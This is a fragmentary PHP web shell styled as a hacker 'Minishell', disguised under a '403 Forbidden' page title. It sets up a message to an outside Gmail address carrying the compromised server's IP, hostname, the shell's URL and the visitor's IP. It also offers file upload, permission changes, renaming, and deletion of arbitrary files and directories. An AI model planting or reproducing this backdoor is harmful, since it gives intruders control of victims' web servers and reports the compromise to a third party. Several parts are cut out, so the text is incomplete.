...
// Forbidden 403 Shell | r00t ~ Hamza Anonime Minishell 
//Coded By Hamza Anonime
...
$time_Sh3ll = "".date("d/m/Y - H:i:s")."";
$ip_remote = $_SERVER["REMOTE_ADDR"];
$from_Sh3llcode = 'Sh3ll@'.gethostbyname($_SERVER['SERVER_NAME']).'';
$to_email = 'Hamzaanonime@gmail.com';
$server_mail = "".gethostbyname($_SERVER['SERVER_NAME'])."  - ".$_SERVER['HTTP_HOST'].""; 
$linkcr = "Link: ".$_SERVER['SERVER_NAME']."".$_SERVER['REQUEST_URI']." - IP Excuting: $ip_remote - Time: $time_Sh3ll";
$header = "From: $from_Sh3llcode\r\nReply-to: $from_Sh3llcode";
...
<form enctype="multipart/form-data" method="post">
  <td align="center">
     <center><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #00ffff , 0px 0px 20px #DF0101;font-family:Kelly Slab;">&lt;/&gt;  Hamza Anonime ~Shell &lt/&gt; </font></center>
          <br>      
...
<h1><font class="Skranji" style="color:white;font-family:'Kelly Slab';font-size: 15px;">Copyright &copy; 2K21 <font color="lime">Anonime</h1>
      <br>
...
<title>403 Forbidden</title><link href="https://fonts.googleapis.com/css?family=Kelly+Slab" rel="stylesheet" type="text/css"> 
<center><p class="blink_text" style="font-size:50px;color:lime;text-shadow: 0px 0px 20px #000 , 0px 0px 20px #000;font-family:Kelly Slab;">&lt;/&gt;  Hamza Anonime ~ Shell &lt;/&gt; </font></center>
<style>
body{
...
echo '<font color="lime"> Suscess </font><br />';
}else{
...
echo '<font color="lime">Change Permission Suscess </font><br/>';
}else{
...
echo '<font color="lime">The name has been changed successfully</font><br/>';
}else{
echo '<font color="red">failed to change </font><br />';
}
...
if($_POST['type'] == 'dir'){
if(rmdir($_POST['path'])){
echo '<font color="lime">Success directory</font><br/>';
}else{
echo '<font color="red">Failed  directory                                                                                                                                                                                                                                                                                             </font><br/>';
}
}elseif($_POST['type'] == 'file'){
if(unlink($_POST['path'])){
echo '<font color="lime">change name file successfly</font><br/>';
}else{
echo '<font color="red">change name file failed</font><br/>';
}
}
}
echo '</center>';
...
echo '<font face="Kelly Slab" color="white" size="2px"><center><br/><b>Copyright &copy; 2K21 <font color="lime">Hamza Anonime</a></center></font>
